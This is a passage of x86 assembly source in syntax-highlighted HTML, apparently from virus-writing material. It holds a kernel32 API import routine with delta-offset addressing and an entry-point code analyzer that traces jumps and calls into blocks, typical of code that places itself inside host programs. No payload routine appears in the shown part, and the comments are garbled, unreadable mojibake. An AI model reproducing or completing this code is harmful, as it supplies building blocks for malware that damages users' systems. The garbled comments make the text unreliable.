    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">aFindIt</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ItsIt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">opos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">obase</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">xpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">k32</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ImportApi</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">a.inc</span><span class="sc0"> </span><span class="sc4">]--------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ?-ÿ&lt;ðÿ¢R  òRýÿ. ? «?ÿ?¢ ôR Jumpÿ¿,  ?ò£ ¡ð÷-R Rö¥Rýð¢ CALL'«.</span><span class="sc0">
</span><span class="sc1">; 'Rýÿ?¢ òÿ ¢£ òRýÿ-ýÿ--«¥</span><span class="sc0">

</span><span class="sc5">Analyse</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; ESi - Entry point</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckBlock</span><span class="sc0">  </span><span class="sc1">; ?« ¢£¢ £³? ö«&lt;ð ? :¡&lt;ð ýÿ - -ÿ ÷«¥Rý</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">XRet</span><span class="sc0">        </span><span class="sc1">; ?-ÿ§? ö£ý?¿ ÷ð¡?¢¬ ¡  ?ò£ ¡ð?c ð ¦ðò&lt;ÿ¿ð</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetSize32</span><span class="sc0">   </span><span class="sc1">; ?ÿ¿?  òR¿¿ÿ-ý«</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddBlock</span><span class="sc0">    </span><span class="sc1">; "Röÿ÷ð¿ ö&lt;Rò òRýÿ</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddData</span><span class="sc0">     </span><span class="sc1">; ? R÷? ð¿ -ÿ ýÿ--«?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">     </span><span class="sc1">; Ret ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GRet</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">     </span><span class="sc1">; Jmp short ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">aJmps</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">     </span><span class="sc1">; Call near</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">aCalln</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">; Jmp near</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">aJmpn</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc0">     </span><span class="sc1">; Jzz ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">t1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07Fh</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">cJmps</span><span class="sc0">

</span><span class="sc5">t1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">     </span><span class="sc1">; LOOPzz ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">t2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">cJmps</span><span class="sc0">

</span><span class="sc5">t2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">      </span><span class="sc1">; Extended Jzz ?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SkipJ</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">SkipJ</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">cJmpn</span><span class="sc0">
    
</span><span class="sc5">SkipJ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">
</span><span class="sc5">GRet</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">XRet</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Analyse</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">aJmps</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJump</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NoIn2</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">  
</span><span class="sc5">NoIn2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">

</span><span class="sc5">cJmps</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJump</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NoIn3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">NoIn3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Analyse</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">

</span><span class="sc5">cJmpn</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJump</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Analyse</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">

</span><span class="sc5">aJmpn</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJump</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">

</span><span class="sc5">aCalln</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJump</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Analyse</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Analyse</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">blocks.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ?ÿ&lt;ð§-«? ô R¦?ý£ « ý&lt;¯  ÿöR¢« ¡ ö&lt;Ròÿ¿ð</span><span class="sc0">

</span><span class="sc5">MaxBlocks</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">AddBlock</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ESi - Position, EAX - Size to extend</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckBlockAdd</span><span class="sc0">   </span><span class="sc1">; ?R³-R ýRöÿ÷ð¢¬ £³? ò ¡£©?¡¢÷£®©?¿£ ö&lt;Rò£ ?</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">CreateBlock</span><span class="sc0"> </span><span class="sc1">; ??ÿ... 'Rýÿýð¿ -R÷«c</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; "÷?&lt;ð§ð¿  ÿ¿?  ö&lt;Ròÿ</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddBlock</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckBlockAdd</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ? R÷? òÿ -ÿ ÷¥R³ý?-ð? ÿý ?¡ÿ ÷ ö&lt;Rò</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ¡ ÷R¿R³-R¡¢¬® ýRöÿ÷&lt;?-ð¯ ÷ òR-?¦ ö&lt;Ròÿ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">BBlock</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Blocks</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CheckIt</span><span class="sc4">:</span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NotHere</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Here</span><span class="sc0">
</span><span class="sc5">NotHere</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckIt</span><span class="sc0">
</span><span class="sc5">BBlock</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Here</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckBlockAdd</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">CheckBlock</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ? R÷? òÿ -ÿ ÷¥R³ý?-ð? ÿý ?¡ÿ ÷ ö&lt;Rò</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">xBBlock</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Blocks</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">xCheckIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">xNotHere</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">xHere</span><span class="sc0">
</span><span class="sc5">xNotHere</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">xCheckIt</span><span class="sc0">
</span><span class="sc5">xBBlock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">xHere</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckBlock</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CreateBlock</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; 'Rýÿ?¢ -R÷«c ö&lt;Rò</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Blocks</span><span class="sc4">][</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CreateBlock</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckBlocks</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">incheck</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoBlocks</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Blocks</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DoCheck</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DoC2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">RightCheck</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">xJoin</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">JoinBlocks</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xJoin</span><span class="sc0">
</span><span class="sc5">RightCheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">xJoin</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">xJoin</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">JoinBlocks</span><span class="sc0">
</span><span class="sc5">xJoin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">DoC2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">DoCheck</span><span class="sc0">

</span><span class="sc5">NoBlocks</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">incheck</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckBlocks</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
